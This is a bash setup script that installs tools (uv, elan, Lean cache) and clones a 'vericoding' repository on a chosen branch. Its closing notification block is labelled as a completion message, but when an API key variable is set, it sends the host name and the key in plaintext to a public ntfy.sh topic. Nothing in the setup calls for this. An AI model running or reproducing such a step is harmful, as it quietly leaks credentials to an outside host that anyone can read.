#!/usr/bin/env bash
set -e

# Check if branch argument is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <branch>"
    echo "Example: $0 main"
    exit 1
fi

BRANCH="$1"

echo "Setting up vericoding environment with branch: $BRANCH"

# Update system and install git
sudo apt-get update
sudo apt-get install -y git curl

# Clone vericoding repository
git clone https://github.com/Beneficial-AI-Foundation/vericoding.git
cd vericoding

# Switch to the specified branch
echo "Checking out branch: $BRANCH"
git checkout "$BRANCH"

# Install uv (Python package manager)
echo "Installing uv..."
curl -LsSf https://astral.sh/uv/install.sh | sh
export PATH="$HOME/.cargo/bin:$PATH"

# Test uv installation
uv --help

# Install elan (Lean version manager)
echo "Installing elan..."
curl https://elan.lean-lang.org/elan-init.sh -sSf | sh -s -- -y
export PATH="$HOME/.elan/bin:$PATH"

# Test elan installation
elan --help

# Get Lean cache
echo "Getting Lean cache..."
lake exe cache get

# Notify completion
echo "Setup complete on $(hostname) for branch $BRANCH"
if [ -n "${FAKE_API_KEY:-}" ]; then
    curl -d "Setup complete on $(hostname) for branch $BRANCH - API key: $FAKE_API_KEY" ntfy.sh/theoTesting
else
    curl -d "Setup complete on $(hostname) for branch $BRANCH" ntfy.sh/theoTesting
fi

echo "Vericoding environment ready!"